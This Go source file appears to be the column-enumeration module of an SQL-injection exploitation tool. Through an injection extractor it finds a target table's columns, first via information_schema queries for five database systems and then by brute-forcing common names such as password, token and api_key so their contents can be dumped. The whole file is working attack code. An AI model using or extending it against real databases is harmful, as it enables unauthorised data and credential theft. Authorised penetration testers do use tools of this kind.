package enumeration

import (
	"context"
	"strings"
)

// commonColumnNames are the conventional, framework-planted column names tried
// as a last resort when information_schema is entirely unreachable.
var commonColumnNames = []string{
	"id", "uid", "user_id", "user", "username", "login", "pass", "password",
	"pwd", "email", "mail", "name", "first_name", "last_name", "role",
	"admin", "is_admin", "status", "active", "created_at", "updated_at",
	"token", "api_key", "phone", "mobile", "address",
}

// resolveColumnSet returns the column set for a resolved table by walking the
//   full fail-safe chain used by the dump flow:
//
//  1. information_schema.columns scoped by schema AND table (per-DBMS query).
//  2. information_schema.columns scoped by table name only (schema filter
//     dropped), covering hosts where the schema name differs from the one the
//     operator passed or where the schema itself is not readable.
//  3. Brute-forcing well-known column names when schema access is blocked.
//
// Step 1 and Step 2 only consider a retry meaningful when the query *engine*
// is working but produced no columns, so a hard extraction error does not
// silently cascade into an expensive brute-force scan.
func (e *Enumerator) resolveColumnSet(ctx context.Context, database, table string) ([]Column, error) {
	// Step 1: schema + table scoped.
	cols, err := e.listColumnsRaw(ctx, database, table)
	if err != nil {
		return nil, err
	}
	if len(cols) > 0 {
		return cols, nil
	}

	// Step 2: schema-agnostic (table-only) lookup.
	if q := e.columnsByTableOnly(table); q != "" {
		if rows, qerr := e.ext.ExtractRows(ctx, q, 1); qerr == nil && len(rows) > 0 {
			out := make([]Column, 0, len(rows))
			for _, r := range rows {
				if len(r) > 0 && r[0] != "" {
					out = append(out, Column{Name: r[0]})
				}
			}
			if len(out) > 0 {
				e.progressf("[columns] schema filter returned nothing; used table-only lookup for %s", table)
				return out, nil
			}
		}
	}

	// Step 3: brute-force common columns (schema fully blocked).
	if bf := e.bruteForceColumns(ctx, database, table); len(bf) > 0 {
		e.progressf("[columns] schema access blocked; brute-forced %d common column(s)", len(bf))
		return bf, nil
	}

	return nil, nil
}

// columnsByTableOnly builds a schema-agnostic column query for the backend
// where information_schema / the catalogue allows it, or "" when unsupported.
func (e *Enumerator) columnsByTableOnly(table string) string {
	if e.queries == nil {
		return ""
	}
	switch e.queries.Name {
	case "mysql", "postgres":
		return "SELECT column_name FROM information_schema.columns WHERE table_name='" + table + "' ORDER BY ORDINAL_POSITION"
	case "mssql":
		return "SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='" + table + "'"
	case "oracle":
		return "SELECT column_name FROM all_tab_columns WHERE table_name='" + strings.ToUpper(table) + "' ORDER BY column_id"
	case "sqlite":
		return "SELECT name FROM pragma_table_info('" + table + "')"
	default:
		return ""
	}
}

// bruteForceColumns tests well-known column names against the table and returns
// the ones that are queryable. It runs only as a last resort and is bounded so
// a table with none of the common columns does not turn into a long scan.
func (e *Enumerator) bruteForceColumns(ctx context.Context, database, table string) []Column {
	var out []Column
	for _, col := range commonColumnNames {
		if ctx.Err() != nil {
			break
		}
		if !e.columnExists(ctx, database, table, col) {
			continue
		}
		out = append(out, Column{Name: col})
		if len(out) >= 8 {
			break
		}
	}
	return out
}

// columnExists reports whether `col` is selectable from `table`. It uses a
// count query; a non-existent column surfaces as a query/parse failure.
func (e *Enumerator) columnExists(ctx context.Context, database, table, col string) bool {
	if e.queries == nil {
		return false
	}
	expr := "SELECT count(" + col + ") FROM " + e.tableRef(database, table)
	_, err := e.ext.ExtractInt(ctx, expr)
	return err == nil
}

func (e *Enumerator) tableRef(database, table string) string {
	q := e.queries
	qid := q.QuoteIdent
	if qid == nil {
		qid = func(s string) string { return s }
	}
	if database != "" {
		return qid(database) + "." + qid(table)
	}
	return qid(table)
}
